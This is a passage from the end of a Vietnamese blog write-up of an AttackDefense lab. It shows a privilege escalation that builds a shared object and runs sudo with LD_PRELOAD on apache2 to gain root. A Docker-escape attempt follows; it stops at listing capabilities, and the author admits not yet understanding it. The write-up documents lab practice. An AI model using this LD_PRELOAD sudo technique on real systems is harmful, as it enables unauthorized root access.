+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">admin@attackdefense:/tmp/duma$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles</span><br><span class="line">admin@attackdefense:/tmp/duma$ sudo LD_PRELOAD=/tmp/duma/shell.so apache2</span><br><span class="line"># bash</span><br><span class="line">bash</span><br><span class="line">root@attackdefense:~#</span><br><span class="line"></span><br><span class="line">root@attackdefense:~# whoami</span><br><span class="line">root</span><br><span class="line"></span><br><span class="line">root@attackdefense:~# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>Ổn luôn, giờ thì leo tiếp lên máy host, vì thực chất máy linux này đang nằm trong một máy ảo, bây giờ sẽ phải vượt từ máy ảo lên máy thật :)</p>
+<h3 id="Docker-escape"><a href="#Docker-escape" class="headerlink" title="Docker escape"></a>Docker escape</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@attackdefense:~# capsh --print</span><br><span class="line">Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep</span><br><span class="line">Bounding set =cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_module,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap</span><br><span class="line">Securebits: 00/0x0/1&#x27;b0</span><br><span class="line"> secure-noroot: no (unlocked)</span><br><span class="line"> secure-no-suid-fixup: no (unlocked)</span><br><span class="line"> secure-keep-caps: no (unlocked)</span><br><span class="line">uid=0(root)</span><br><span class="line">gid=0(root)</span><br><span class="line">groups=0(root)</span><br></pre></td></tr></table></figure>
+<p>Đoạn này chả hiểu gì, thôi để bao giờ hiểu thì update lại sau vậy…</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/write-up/" rel="tag"># write up</a>
+              <a href="/tags/attackdefense/" rel="tag"># attackdefense</a>
+              <a href="/tags/medium/" rel="tag"># medium</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/25/ultratech1-tryhackme/" rel="prev" title="[TryHackMe] UltraTech1">
+                  <i class="fa fa-angle-left"></i> [TryHackMe] UltraTech1
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/01/vulnos2-vulnhub/" rel="next" title="[VulnHub] VulnOS 2">
+                  [VulnHub] VulnOS 2 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">minhnq22</span>
+  </div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="Back to top">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
